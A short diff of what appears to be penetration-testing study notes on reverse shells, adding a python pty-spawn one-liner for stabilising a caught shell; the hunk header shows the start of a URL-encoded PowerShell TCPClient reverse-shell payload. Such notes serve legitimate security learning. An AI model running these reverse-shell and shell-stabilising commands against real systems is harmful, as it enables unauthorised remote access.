@@ -40,7 +40,7 @@ powershell%20-c%20%22%24client%20%3D%20New-Object%20System.Net.Sockets.TCPClient
 
 Ok, we have a shell. Now what?  
   
-  
+  Import pty module using python: `python -c 'import pty; pty.spawn("/bin/sh")'`
   
 We've covered lots of ways to generate, send and receive shells. The one thing that these all have in common is that they tend to be unstable and non-interactive. Even Unix style shells which are easier to stabilise are not ideal. So, what can we do about this?
 
